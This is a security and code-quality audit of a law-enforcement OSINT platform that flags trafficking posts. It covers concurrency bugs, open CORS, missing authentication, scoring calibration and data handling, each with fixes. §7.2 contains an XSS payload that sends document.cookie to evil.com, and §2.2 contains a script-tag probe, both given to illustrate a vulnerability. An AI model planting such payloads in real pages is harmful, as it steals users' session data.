# D-TRACK OSINT Platform — Full Technical Audit

**Date:** 2026-04-09 · **Auditor:** Antigravity · **Scope:** All 11 dimensions, all files

---

## 1. Architecture & Scalability

### 1.1 Global `_state` dict — Race Conditions

[main.py:54–65](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/main.py#L54-L65)

The entire pipeline's working data lives in a single unsynchronized `dict`:

```python
_state = {
    "loaded": False,
    "profiles_raw": [],
    ...
}
```

**Race conditions identified:**

| Scenario | Failure Mode | Severity |
|----------|-------------|----------|
| Two GET requests arrive before `_state["loaded"]` is `True` | Both call `run_full_pipeline()` concurrently → the dict is overwritten mid-flight by whichever finishes last | 🔴 Critical |
| GET `/api/graph` mid-pipeline while `_state["graph"]` is being reassigned | The endpoint reads `None` or a partially-constructed graph | 🔴 Critical |
| POST `/api/add-profile` fires while a GET auto-triggers pipeline | `profiles_raw` is appended during iteration → potential `RuntimeError` or data loss | 🟠 High |
| Pipeline fails step 3 after step 2 wrote to `_state["profile_analyses"]` | State is half-populated: `loaded` stays `False`, next request retries everything | 🟡 Medium |

**Fix:** Replace the global dict with a `threading.Lock`-guarded singleton, or better, encapsulate all state in a class with an async read-write lock (`asyncio.Lock`). At scale, move to Redis or a proper database.

---

### 1.2 Synchronous `run_full_pipeline()` Inside `async` Endpoints

[main.py:170–180](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/main.py#L170-L180)

```python
@app.post("/api/ingest")
async def ingest_data():
    run_full_pipeline()      # ← blocking, CPU-bound
```

FastAPI runs `async def` handlers on the **main event loop**. A CPU-bound call here blocks the entire server — no other requests can be processed for the full duration (several seconds for model encoding, graph metrics). Under concurrent load this cascades into request timeouts.

**Fix options (pick one):**
1. **`run_in_executor`** — `await asyncio.get_event_loop().run_in_executor(None, run_full_pipeline)` pushes it to a thread pool.
2. **`def` (not `async def`)** — FastAPI auto-threads synchronous endpoints, but you lose the event loop for everything else.
3. **Background task** — `BackgroundTasks` lets the POST return immediately; the client polls for completion.

---

### 1.3 Deprecated `@app.on_event("startup")`

[main.py:381–388](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/main.py#L381-L388)

`on_event("startup")` was deprecated in FastAPI 0.103+ in favor of **lifespan context managers**:

```python
from contextlib import asynccontextmanager

@asynccontextmanager
async def lifespan(app: FastAPI):
    # startup
    try:
        await asyncio.to_thread(run_full_pipeline)
    except Exception as e:
        print(f"[WARN] Auto-load failed: {e}")
    yield
    # shutdown cleanup

app = FastAPI(lifespan=lifespan, ...)
```

---

### 1.4 Pipeline Failure → Infinite Auto-Retry Loop

Every GET endpoint follows this pattern:

```python
if not _state["loaded"]:
    run_full_pipeline()
```

If the pipeline **throws** (e.g., model download fails, JSON parse error), `loaded` stays `False`. The **next request retries immediately**, creating a hot-loop of failures that hammers the filesystem / GPU / network. There is no backoff, no retry limit, and no error state the caller can inspect.

**Fix:** Introduce a `_state["error"]` field; after N failures, surface the error to the API and stop retrying until explicitly reset.

---

## 2. API Design & Security

### 2.1 CORS `allow_origins=["*"]`

[main.py:45–50](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/main.py#L45-L50)

> [!CAUTION]
> For a law-enforcement tool, wildcard CORS means **any webpage on the internet** can make authenticated requests to this backend if a user happens to have it running. A malicious page could:
> - Exfiltrate the full intelligence graph (`GET /api/graph`)
> - Inject poisoned profiles (`POST /api/add-profile`)
> - Trigger pipeline DoS (`POST /api/ingest` in a loop)
>
> **Fix:** Whitelist only the Streamlit origin, e.g. `allow_origins=["http://localhost:8501"]`. For production, use environment-variable-based origin lists.

### 2.2 Input Sanitisation — `/api/add-profile`

[main.py:273–322](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/main.py#L273-L322)

The endpoint accepts a **raw `dict`**, not a `Profile` Pydantic model. Attack vectors:

| Vector | Mechanism | Impact |
|--------|-----------|--------|
| **JSON injection** | Arbitrary keys added to the profile dict propagate into `mock_data.json` and through the entire pipeline. A key like `"__class__"` or deeply nested dicts can cause downstream crashes. | 🟠 High |
| **XSS via post text** | A post containing `<script>alert(1)</script>` is stored, then rendered **raw** in the Streamlit dashboard (see §7.2). | 🔴 Critical |
| **Disk DoS** | Submit a profile with 10,000 posts, each with a 1 MB text field. The JSON is written synchronously with `json.dump`, blocking the server and potentially filling disk. | 🟠 High |
| **Path traversal** | Not directly exploitable since `DATA_PATH` is hardcoded, but if the user controls `data/` via CLI params this becomes exploitable. | 🟡 Low for now |

**Fix:** Change the signature to `async def add_profile(profile: Profile):` — the existing Pydantic `Profile` model validates types, constrains fields, and rejects unknown keys.

### 2.3 No Authentication

**All 12 endpoints are unauthenticated.** Endpoints that absolutely must be protected for a law-enforcement MVP:

| Endpoint | Risk if exposed | Priority |
|----------|----------------|----------|
| `POST /api/add-profile` | Inject false intelligence | 🔴 Critical |
| `POST /api/add-profiles-bulk` | Bulk poison the dataset | 🔴 Critical |
| `POST /api/ingest` | Trigger expensive pipeline at will | 🟠 High |
| `GET /api/identities` | Leak all intelligence | 🟠 High |
| `GET /api/graph/html` | Full network topology exposure | 🟠 High |
| `GET /api/risk-scores` | Reveal active targets | 🟠 High |

**Recommended auth strategy for FastAPI MVP:**
- `fastapi.security.HTTPBearer` + static API key for the MVP.
- For multi-user: JWT tokens via `python-jose` + `passlib`, with role-based scoping (`admin` for write endpoints, `analyst` for read).

---

## 3. NLP Engine

### 3.1 Thread-Unsafe Lazy Model Loading

[nlp_engine.py:14–15](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/nlp_engine.py#L14-L15), [nlp_engine.py:51–63](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/nlp_engine.py#L51-L63)

```python
_model = None

def _load_model():
    global _model, _anchor_embeddings
    if _model is not None:     # ← TOCTOU race
        return
    _model = SentenceTransformer(...)
```

If two requests hit `compute_intent_score()` before the model loads:
1. Both threads see `_model is None` → both begin downloading/loading the ~80 MB model.
2. `_anchor_embeddings` may be set by thread A while thread B is still loading, leading to a stale reference or `None` access.

**Fix:** Use `threading.Lock` around the load, or load eagerly at startup.

---

### 3.2 Redundant Manual Cosine Similarity

[nlp_engine.py:62](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/nlp_engine.py#L62), [nlp_engine.py:66–73](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/nlp_engine.py#L66-L73)

`normalize_embeddings=True` means all vectors have unit L2 norm. For unit vectors, cosine similarity = **dot product**. The manual `_cosine_similarity` function divides by norms that are already 1.0 — it computes three unnecessary `np.linalg.norm` calls per comparison.

**Performance-correct approach:**
```python
similarities = text_embedding @ _anchor_embeddings.T  # single matmul
max_sim_idx = np.argmax(similarities)
```
This replaces 10 loop iterations + 30 norm calculations with one vectorized operation.

---

### 3.3 SOL Wallet Regex — High False-Positive Rate

[nlp_engine.py:48](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/nlp_engine.py#L48)

```python
SOL_WALLET_RE = re.compile(r"\b[1-9A-HJ-NP-Za-km-z]{32,44}\b")
```

This matches **any Base58 string of 32–44 characters**. In practice:
- Common English words joined (e.g., hash fragments, base64 snippets) will match.
- The filter `len(addr) >= 32 and not addr.isalpha()` helps but won't catch strings like `ABCDEfghij1234567890abcdefghijkl`.
- **Estimated false-positive rate on typical social media text:** moderate (~5–10% of posts containing long hashes or encoded URLs).

**Tightening strategies:**
1. Require exactly 32, 43, or 44 characters (valid Solana address lengths).
2. Validate Base58 checksum (first 4 bytes of SHA-256 double hash).
3. Cross-reference against known prefixes or on-chain validation via an API.

---

### 3.4 Flagging Threshold at 0.4 — Calibration

[nlp_engine.py:156](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/nlp_engine.py#L156)

The threshold of 0.4 appears to be ad-hoc. Given the anchor sentences are all highly specific trafficking phrases, `all-MiniLM-L6-v2` typically produces:
- ~0.3–0.5 for vaguely similar commercial text ("DM for prices")
- ~0.5–0.8 for near-exact trafficking language
- ~0.1–0.25 for clearly benign text

0.4 is in the **ambiguous zone**, meaning many borderline-benign posts ("New batch of protein powder arrived. DM for pricing") will be flagged.

**Calibration strategy:**
1. Run the model against the full mock dataset and compute the score distribution.
2. Use precision-recall analysis against the labeled ground truth (known trafficker vs. benign profiles).
3. Choose a threshold that maximizes F1 or a custom cost function (false negatives are worse than false positives in this domain).
4. Make the threshold configurable via environment variable or API parameter.

---

### 3.5 Emoji Boost — False-Critical Risk

[nlp_engine.py:139–141](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/nlp_engine.py#L139-L141), [nlp_engine.py:153](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/nlp_engine.py#L153)

```python
emoji_boost = min(0.15, 0.05 * len(found_emojis))
intent_score = min(1.0, base_score + emoji_boost + price_boost + wallet_boost)
```

**Yes, this can produce false Criticals.** Example scenario:

| Input | Base Score | Emoji Boost | Total | Flagged? |
|-------|-----------|-------------|-------|----------|
| "Snow capped peaks of Himachal 🏔️❄️ Fresh mountain air 🌿🍃" | ~0.23 | +0.15 (3 drug emojis: ❄️, 🌿, 🍃) | 0.38 | No (below 0.4) |
| Same + 🌱 added | ~0.23 | +0.15 | 0.38 | No |
| "Beautiful snow day ❄️🌿🍃 Nature is healing 🌱" (longer match to anchors) | ~0.30 | +0.15 | 0.45 | **Yes — FLAGGED** |

The boost is **additive and unconditional** — it doesn't consider whether the semantic context supports drug-related interpretation. The `DRUG_EMOJIS` set includes ❄️, 🌿, 🍃 which are extremely common in nature/travel/food content.

**Fix:** Make the emoji boost **multiplicative** on the base score (e.g., `emoji_factor = 1 + 0.15 * n_emojis`), so it only amplifies already-suspicious text. Or require a minimum base semantic score (e.g., 0.3) before applying emoji boost.

---

## 4. Identity Resolver

### 4.1 Union-Find Edge Cases

[identity_resolver.py:56–89](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/identity_resolver.py#L56-L89)

**Bug — hand-rolled Union-Find lacks path compression and has a merge ordering issue:**

Consider: Profile A has wallets [W1, W2]. W1 already belongs to Group 0, W2 to Group 5.

When processing W1: A joins Group 0. When processing W2: `existing_groups = {0, 5}` → merges into `min(0, 5) = 0`. This is **correct**, but the implementation iterates `groups[gid]` while deleting keys from `groups` (line 79: `del groups[gid]`), which works only because it iterates a **different** gid. 

However, there is a subtler issue: **the wallet→profiles mapping can map the same profile to multiple wallets across separate iterations**. If profile A appears in both `wallet_to_profiles[W1]` and `wallet_to_profiles[W2]`, and these are processed in separate loop iterations, profile A's group ID is updated correctly, but the `groups` dict may contain stale references if a third wallet introduces yet another group that needs merging.

**Assessment:** The implementation works correctly for the current dataset but is fragile. A proper Union-Find with path compression and union-by-rank would be more robust and performant.

---

### 4.2 Phone Normalization Gaps

[identity_resolver.py:47](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/identity_resolver.py#L47)

```python
normalized_phone = re.sub(r"[\s\-\.]", "", phone)
```

**Formats that fail to match:**

| Format | Example | Result after normalization |
|--------|---------|--------------------------|
| Parenthesized area code | `(91) 98765 43210` | `(91)9876543210` — parentheses retained → no match |
| International `+` prefix variations | `+91-98765-43210` vs `91-98765-43210` | `+919876543210` vs `919876543210` — no match |
| Country code with `00` prefix | `0091-98765-43210` | `00919876543210` — no match with `+91` variant |
| Extension suffixes | `98765-43210 ext 5` | `9876543210ext5` → broken |

**Fix:** Use a library like `phonenumbers` to parse into E.164 format, or at minimum strip parentheses and normalize the `+`/`00` prefix.

---

### 4.3 External @mentions Silently Dropped

[identity_resolver.py:233–237](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/identity_resolver.py#L233-L237)

```python
if mention_lower in username_to_profile:
    target_id = username_to_profile[mention_lower]
    if target_id != profile["profile_id"]:
        promo_links.append(...)
```

If a profile mentions `@external_account` that isn't in the dataset, the `if` condition simply fails and the mention is **silently dropped**. No error, no warning, no record.

**Impact:** Perfectly correct behavior for a closed dataset, but this means the system cannot detect **outbound promotion** to accounts outside its dataset — a significant intelligence gap for real OSINT work. At minimum, these should be logged as "unresolved external mentions" for analyst review.

---

### 4.4 Unstable Identity IDs Across Runs

[identity_resolver.py:151](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/identity_resolver.py#L151)

```python
"identity_id": f"ID-{group_id:03d}"
```

`group_id` is a **monotonically incrementing counter** inside `resolve_identities()`. Every time the pipeline runs (including after `/api/add-profile`), groups are rebuilt from scratch. Adding or removing a single profile can **shift all group IDs**.

**Implications:**
- Any external system storing `ID-003` as a reference will silently point to a different identity after a pipeline re-run.
- Leaderboard rankings stored client-side become stale.
- No audit trail — the same person can be ID-003 in one run and ID-007 in the next.

**Fix:** Generate deterministic identity IDs based on a hash of the sorted member profile IDs (e.g., `f"ID-{hashlib.md5(sorted_pids.encode()).hexdigest()[:8]}"`).

---

## 5. Graph Builder

### 5.1 Betweenness Centrality Scaling

[graph_builder.py:162](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/graph_builder.py#L162)

`nx.betweenness_centrality(G, weight="weight")` is **O(VE)** (specifically O(V × E) for weighted graphs using Brandes' algorithm).

| Graph Size | Nodes | Edges (est.) | Time (est.) |
|-----------|-------|------------|-------------|
| Current demo | ~35 | ~50 | <10ms ✅ |
| 500 profiles | ~600 | ~2,000 | ~1s ⚠️ |
| 5,000 profiles | ~6,000 | ~20,000 | ~120s 🔴 |
| 50,000 profiles | ~60,000 | ~200,000 | hours 💀 |

**Mitigation:** At >1,000 nodes, switch to approximate betweenness (`nx.betweenness_centrality(G, k=100)` — samples k pivot nodes) or use `networkit`/`graph-tool` for C++-backed computation.

---

### 5.2 Eigenvector Centrality Zero-Fallback

[graph_builder.py:167–168](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/graph_builder.py#L167-L168)

```python
except nx.PowerIterationFailedConvergence:
    eigenvector_cent = {n: 0.0 for n in G.nodes()}
```

When eigenvector centrality fails (common for disconnected or star-shaped graphs), **all nodes get 0.0**. This propagates to `risk_scorer.py` where eigenvector has a 20% weight in the centrality composite:

```python
0.2 * metrics.get("eigenvector_centrality", 0)  # always 0
```

**Effect:** The centrality component silently loses 20% of its dynamic range. The remaining 80% (degree + betweenness + pagerank) is **not re-normalized**, so all centrality scores are systematically deflated. This skews risk scores downward for all identities.

**Fix:** Either re-weight the remaining metrics to sum to 1.0 when eigenvector fails, or use `nx.eigenvector_centrality_numpy()` which handles disconnected graphs via the largest eigenvalue.

---

### 5.3 Uncached PyVis HTML

[main.py:210](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/main.py#L210)

```python
html = generate_pyvis_html(_state["graph"])
return HTMLResponse(content=html)
```

The PyVis HTML is **regenerated from scratch** on every call to `/api/graph/html`. This involves constructing a full `Network` object, iterating all nodes/edges, and calling `net.generate_html()`. For 35 nodes this takes ~50ms; for larger graphs it will be substantial.

**Fix:** Cache the HTML string in `_state["graph_html"]` after each pipeline run. Invalidate on re-run.

---

### 5.4 Node Size for 0-Follower Accounts

[graph_builder.py:81](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/graph_builder.py#L81)

```python
size = max(15, min(50, profile.get("followers", 0) // 100 + 15))
```

For `followers=0`: `0 // 100 + 15 = 15` → size = 15 (minimum). This is the same size as accounts with up to 99 followers. Wallet nodes get a hardcoded `size=30`.

**Problem:** A brand-new custom profile with 0 followers appears **smaller** than a wallet node, which is misleading since the wallet is a passive entity. The size should reflect importance, not just follower count.

---

## 6. Risk Scorer

### 6.1 Max-Normalization Instability

[risk_scorer.py:89–94](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/risk_scorer.py#L89-L94)

```python
max_centrality = max((s["centrality"] for s in raw_scores), default=1.0)
centrality_norm = (scores["centrality"] / max_centrality) * 100
```

If only one identity has non-zero centrality (e.g., a single hub), it gets `100/100 = 100` for the centrality component regardless of whether its actual centrality is 0.01 or 0.99.

**This means adding a single connected profile to an otherwise disconnected graph gives it an automatic 40-point risk boost (40% weight × 100).**

**Better alternative:** Use percentile-based normalization against a reference distribution, or use absolute thresholds derived from domain expertise (e.g., betweenness > 0.3 = high). At minimum, apply a sigmoid or log transform to dampen outlier sensitivity.

---

### 6.2 Wallet Ownership as Connection Credit

[risk_scorer.py:77](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/risk_scorer.py#L77)

```python
(0.2 if has_wallet else 0.0)  # part of connection_score
```

This gives a **flat 20% connection boost** to any identity with a crypto wallet. A legitimate crypto trader (PROF-014 `@crypto_trader_IN`) gets the same boost as a drug vendor. The wallet presence is already factored into graph connectivity; double-counting it in the connection score inflates risk for benign crypto users.

**Fix:** Remove the wallet credit from the connection score, or qualify it (e.g., only credit wallets that appear in >1 identity group).

---

### 6.3 Orphaned Wallet Nodes

[risk_scorer.py:171–178](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/risk_scorer.py#L171-L178)

```python
for node in graph_data.get("nodes", []):
    node_id = node["id"]
    if node_id in identity_lookup:          # ← wallet IDs are never keys here
        ...
```

`identity_lookup` maps **profile IDs** → identities. Wallet nodes (whose `id` is the wallet address string) are never in this lookup. As a result:

- Wallet nodes retain their **default** risk_score of `0.0` and risk_level of `"Low"`.
- They are always colored green (`#4CAF50`), regardless of the risk of the identity they're linked to.

This is **misleading**: a wallet shared by two Critical-risk traffickers appears green/safe in the graph.

**Fix:** After updating account nodes, iterate wallet nodes and inherit the maximum risk level of their linked account nodes.

---

### 6.4 Hardcoded Risk Thresholds

[risk_scorer.py:113–120](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/risk_scorer.py#L113-L120)

The thresholds `[31, 61, 86]` are not calibrated against the mock data distribution. Given max-normalization, the actual distribution is highly dependent on the dataset composition. Adding benign profiles shifts everyone's centrality upward relative to the max.

**Recommendation:** Make thresholds configurable via environment variables or a config file. Log the score distribution histogram on each pipeline run for operational awareness.

---

## 7. Frontend (Streamlit Dashboard)

### 7.1 Synchronous Blocking During Pipeline

[app.py:360–372](file:///c:/Users/harsh/OneDrive/Desktop/d_track/frontend/app.py#L360-L372)

`requests.get(url, timeout=120)` is synchronous. During a long pipeline run (especially first start with model download ~30–90s), the Streamlit UI **freezes completely** — no rendering, no spinner, no user feedback. The 120s timeout means the browser may show a blank page for up to 2 minutes.

**Fix:** Use `st.spinner()` around API calls (partially done for the sidebar button), and consider adding a `/api/health` lightweight endpoint that returns instantly to distinguish "backend alive but busy" from "backend offline".

---

### 7.2 XSS via Raw HTML Injection

> [!CAUTION]
> [app.py:787](file:///c:/Users/harsh/OneDrive/Desktop/d_track/frontend/app.py#L787)
> ```python
> <div class="post-text">{post.get('text','')}</div>
> ```
> 
> Post text is rendered via `st.markdown(..., unsafe_allow_html=True)` with **no HTML escaping**. If an attacker submits a profile (via the unauthenticated `/api/add-profile`) with a post containing:
> ```html
> <img src=x onerror="fetch('https://evil.com/steal?data='+document.cookie)">
> ```
> This executes in the analyst's browser. Combined with the open CORS and no auth, this is a **full attack chain**: inject profile → analyst views dashboard → XSS fires → exfiltrate intelligence data.
> 
> **Fix:** Use `html.escape()` on all user-supplied text before embedding in HTML, or use `st.text()` / `st.code()` for post content.

---

### 7.3 Silent Error Swallowing

[app.py:360–372](file:///c:/Users/harsh/OneDrive/Desktop/d_track/frontend/app.py#L360-L372)

```python
def api_call(endpoint, method="GET", data=None):
    try:
        ...
    except requests.exceptions.ConnectionError:
        return None
    except Exception:
        return None     # ← all errors vanish
```

Every tab then checks `if result:` → shows "Run Pipeline". A user cannot distinguish:
- Backend offline
- Backend running but pipeline failed
- Network timeout
- Malformed response

**Better UX:**
```python
def api_call(endpoint, ...):
    try:
        ...
    except requests.exceptions.ConnectionError:
        return {"_error": "Backend offline", "_type": "connection"}
    except requests.exceptions.Timeout:
        return {"_error": "Request timed out", "_type": "timeout"}
    except Exception as e:
        return {"_error": str(e), "_type": "unknown"}
```

Then render differentiated error states (with the command to start the backend when offline, and a retry button otherwise).

---

### 7.4 Non-Responsive Graph Iframe

[app.py:524](file:///c:/Users/harsh/OneDrive/Desktop/d_track/frontend/app.py#L524)

```python
st.components.v1.html(resp.text, height=700, scrolling=False)
```

`height=700` is hardcoded in pixels. On mobile viewports (< 768px), this:
1. Creates a massive scrollable area that dominates the page.
2. The PyVis canvas itself has `height="700px"` hardcoded in its HTML (line 226 of graph_builder.py).

**Fix:** Use `height=min(700, viewport_height)` or inject responsive CSS into the PyVis HTML via a wrapper:
```html
<style>body,#mynetwork{height:100vh!important;max-height:700px}</style>
```

---

## 8. Reference Module — Video Indexer

### 8.1 Fragile `_fps_override`

[video_indexer.py:385–386](file:///c:/Users/harsh/OneDrive/Desktop/d_track/wtf_reference/module1/video_indexer/video_indexer.py#L385-L386)

```python
if args.fps:
    indexer._fps_override = args.fps
```

Setting a "private" attribute from outside the class is fragile — it bypasses encapsulation, won't survive refactoring, and isn't documented in the class interface.

**Fix:** Add `fps_override: float = None` as a constructor parameter, or accept it in `process_video()`:
```python
class VideoIndexer:
    def __init__(self, config: dict, fps_override: float = None):
        self.fps_override = fps_override
```

---

### 8.2 `list()` Wrapping for Dict Iteration — Confirmed Safe

[video_indexer.py:295](file:///c:/Users/harsh/OneDrive/Desktop/d_track/wtf_reference/module1/video_indexer/video_indexer.py#L295)

```python
for tid, (cls, zone, _, cx_prev, cy_prev) in list(active_tracks.items()):
```

This is **safe and necessary**. The `list()` call creates a snapshot of the dict items at that moment. Inside the loop body (line 302), `active_tracks[tid]` is updated in-place, which is fine because we're modifying **values**, not adding/removing keys. Without `list()`, a `RuntimeError: dictionary changed size during iteration` would occur if the subsequent track-removal block (lines 290–293) happened in the same iteration — but it doesn't because removal happens before this loop. Still, the `list()` is defensive and correct.

---

### 8.3 Relative Output Path

[video_indexer.py:323](file:///c:/Users/harsh/OneDrive/Desktop/d_track/wtf_reference/module1/video_indexer/video_indexer.py#L323), [video_indexer.py:351](file:///c:/Users/harsh/OneDrive/Desktop/d_track/wtf_reference/module1/video_indexer/video_indexer.py#L351)

```python
out_dir = CONFIG["output_dir"]    # "output"
Path(out_dir).mkdir(exist_ok=True)
```

If the script is run from a different working directory (e.g., `python wtf_reference/module1/video_indexer/video_indexer.py`), the `output/` directory is created **relative to CWD**, not relative to the script. This means outputs land in an unexpected location.

**Fix:**
```python
out_dir = Path(__file__).resolve().parent / CONFIG["output_dir"]
```

---

## 9. Reference Module — RAG Decoder

### 9.1 Blocking MongoDB in Constructor

[decoder.py:134](file:///c:/Users/harsh/OneDrive/Desktop/d_track/wtf_reference/module2/rag_decoder/decoder.py#L134), [decoder.py:181–193](file:///c:/Users/harsh/OneDrive/Desktop/d_track/wtf_reference/module2/rag_decoder/decoder.py#L181-L193)

```python
def __init__(self, ...):
    ...
    self._connect_mongo(mongo_uri)    # blocking network call

def _connect_mongo(self, mongo_uri):
    self.mongo_client = MongoClient(mongo_uri, serverSelectionTimeoutMS=3000)
    self.mongo_client.admin.command("ping")    # ← blocks up to 3 seconds
```

In an async server context (e.g., if this decoder is imported into a FastAPI app), this **blocks the event loop for up to 3 seconds** during object construction. Even in sync contexts, 3s of constructor latency is surprising.

**Fix:**
1. Make `_connect_mongo` lazy — only connect on first DB write.
2. Or use `motor` (async MongoDB driver) if in an async context.
3. Or move the ping to a separate `connect()` method that callers invoke explicitly.

---

### 9.2 Double-Annotation Risk in `_annotate_text`

[decoder.py:294–310](file:///c:/Users/harsh/OneDrive/Desktop/d_track/wtf_reference/module2/rag_decoder/decoder.py#L294-L310)

```python
for ft in sorted(flagged_terms, key=lambda x: len(x["token"]), reverse=True):
    pattern = re.compile(re.escape(token), re.IGNORECASE)
    annotated = pattern.sub(replacement, annotated, count=1)
```

Sorting by token length (longest first) and using `count=1` **mitigates** but does **not fully prevent** double-annotation. Example:

- DEA terms: "black ice" (methamphetamine), "ice" (methamphetamine)
- Input: "bring some black ice"
- First pass (longest): "black ice" → `[black ice → methamphetamine/black ice]`
- Second pass: "ice" matches the "ice" inside the annotation marker `→ methamphetamine/black ice]` — but since `count=1`, it replaces the **first occurrence** which is now inside the annotation bracket.

Result: `"bring some [black [ice → methamphetamine/ice] → methamphetamine/black ice]"` — **corrupted annotation**.

**Fix:** After replacing a term, mark the replaced region as off-limits (e.g., use placeholder tokens, or track character offsets and skip them).

---

### 9.3 Subprocess Training Invocation

[decoder.py:594–601](file:///c:/Users/harsh/OneDrive/Desktop/d_track/wtf_reference/module2/rag_decoder/decoder.py#L594-L601)

```python
result = subprocess.run(
    [sys.executable, str(build_script)],
    cwd=str(BASE_DIR),
)
```

**Advantage vs. direct import:** Process isolation — if `build_training_data.py` crashes, leaks memory, or has conflicting global state, it doesn't pollute the parent process. Training scripts often manipulate GPU memory aggressively; subprocess ensures clean teardown.

**Failure mode introduced:** The subprocess inherits `sys.executable` but **not necessarily the same virtual environment** if the script is invoked via a wrapper. The `cwd` is correct, but the `PYTHONPATH` may differ. If `build_training_data.py` fails, the only feedback is `returncode != 0` — no exception traceback is captured.

**Fix:** Capture `stderr` via `subprocess.run(..., capture_output=True)` and log it on failure.

---

### 9.4 Inconsistent Model Error Handling

[decoder.py:136–142](file:///c:/Users/harsh/OneDrive/Desktop/d_track/wtf_reference/module2/rag_decoder/decoder.py#L136-L142) vs [decoder.py:163–171](file:///c:/Users/harsh/OneDrive/Desktop/d_track/wtf_reference/module2/rag_decoder/decoder.py#L163-L171)

| Model | Missing behavior |
|-------|-----------------|
| Binary classifier | `raise FileNotFoundError` — **hard crash** |
| Substance classifier | `print("[WARN]...")`, `return` — **silent degradation** |

This asymmetry means the decoder can run with **no substance classification** and silently return `substance=None` for all coded messages. An analyst might see "Message is coded" with no substance identified and assume the model is confident there's no specific substance, when in reality the model simply doesn't exist.

**Recommendation:** This should be **configurable**:
```python
class CodedLanguageDecoder:
    def __init__(self, ..., require_substance_model: bool = False):
        ...
        if require_substance_model and self.substance_model is None:
            raise FileNotFoundError(...)
```

---

## 10. Testing, Observability & DevOps

### 10.1 Top 5 Priority Test Cases

| # | Test Case | Module | Why Highest Priority |
|---|-----------|--------|---------------------|
| 1 | **Union-Find merge correctness** — 3 profiles sharing 2 wallets across 2 groups merge into exactly 1 group | `identity_resolver` | Core correctness of the identity stitching. A merge bug means wrong people are flagged. |
| 2 | **Intent score for known-benign text** returns < 0.4 (unflagged), known-trafficking text returns ≥ 0.4 | `nlp_engine` | Validates the entire flagging pipeline doesn't produce false positives/negatives for obvious cases. |
| 3 | **Risk score determinism** — same input data produces identical identities and risk scores across runs | `risk_scorer` + `identity_resolver` | Ensures the pipeline is reproducible, critical for forensic credibility. |
| 4 | **Pipeline error recovery** — simulate model load failure and verify `_state["loaded"]` reflects error, no infinite retry | `main` | The infinite-retry loop is a production outage risk. |
| 5 | **XSS-safe rendering** — profile with `<script>` in post text does not execute when rendered in Streamlit HTML | `frontend/app` | Directly exploitable security vulnerability. |

---

### 10.2 Logging Strategy

Replace all `print()` statements with structured logging:

```python
import logging
logger = logging.getLogger("dtrack")

# In main.py startup:
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(name)s | %(levelname)s | %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("dtrack.log"),
    ]
)
```

| Current `print()` | Recommended Level |
|-------|----------|
| Pipeline step progress | `INFO` |
| Model loading | `INFO` |
| Auto-load failed | `WARNING` |
| Pipeline errors | `ERROR` |
| Score distributions | `DEBUG` |
| Endpoint timing | `DEBUG` |

---

### 10.3 Unpinned Dependency Risks

```
torch>=2.0.0        # Could install torch 3.x with breaking API changes
numpy>=1.24.0       # numpy 2.0 broke many downstream packages
scikit-learn>=1.3.0  # API deprecations across minor versions
```

For a **forensic tool requiring reproducible results**, unpinned dependencies are unacceptable:
- Different `torch` versions produce **different floating-point results** for the same model, changing intent scores.
- `numpy 2.0` changed default dtypes, potentially changing normalization behavior.
- **Fix:** Pin all dependencies with exact versions in `requirements.txt`, and add a `requirements-lock.txt` generated via `pip freeze`.

---

### 10.4 Minimum Viable Dockerfile

```dockerfile
FROM python:3.10-slim

WORKDIR /app

# Install dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy app
COPY . .

# Expose ports
EXPOSE 8000 8501

# Start both services
CMD ["sh", "-c", "uvicorn backend.main:app --host 0.0.0.0 --port 8000 & streamlit run frontend/app.py --server.port 8501 --server.address 0.0.0.0"]
```

> [!NOTE]
> For production, split into two containers (FastAPI + Streamlit) behind a reverse proxy. Add health checks, non-root user, and multi-stage builds to reduce image size (torch alone is ~2 GB).

---

## 11. Data & Privacy

### 11.1 Atomic Write Corruption Risk

[main.py:308–309](file:///c:/Users/harsh/OneDrive/Desktop/d_track/backend/main.py#L308-L309)

```python
with open(DATA_PATH, "w", encoding="utf-8") as f:
    json.dump(dataset, f, indent=2, ensure_ascii=False)
```

`open("w")` **truncates the file to zero bytes** before writing. If the process crashes mid-write (OOM, power loss, Ctrl+C), `mock_data.json` is left **empty or partially written** — all data is lost.

**Fix — atomic write pattern:**
```python
import tempfile, os

def atomic_write_json(path, data):
    dir_path = os.path.dirname(path)
    with tempfile.NamedTemporaryFile(
        mode='w', dir=dir_path, suffix='.tmp',
        delete=False, encoding='utf-8'
    ) as tmp:
        json.dump(data, tmp, indent=2, ensure_ascii=False)
        tmp.flush()
        os.fsync(tmp.fileno())
        tmp_path = tmp.name
    os.replace(tmp_path, path)  # atomic on POSIX; near-atomic on Windows
```

---

### 11.2 Data Governance Gap

> [!WARNING]
> The footer claims **"Synthetic Data Only"** and the README states "exclusively synthetic/mock data". However:
> 
> - `/api/add-profile` accepts arbitrary real profile data (real usernames, real wallet addresses, real phone numbers).
> - This data is **persisted to disk** permanently in `mock_data.json`.
> - There is **no data retention policy**, no deletion endpoint, no consent mechanism, and no audit trail of who added what data.
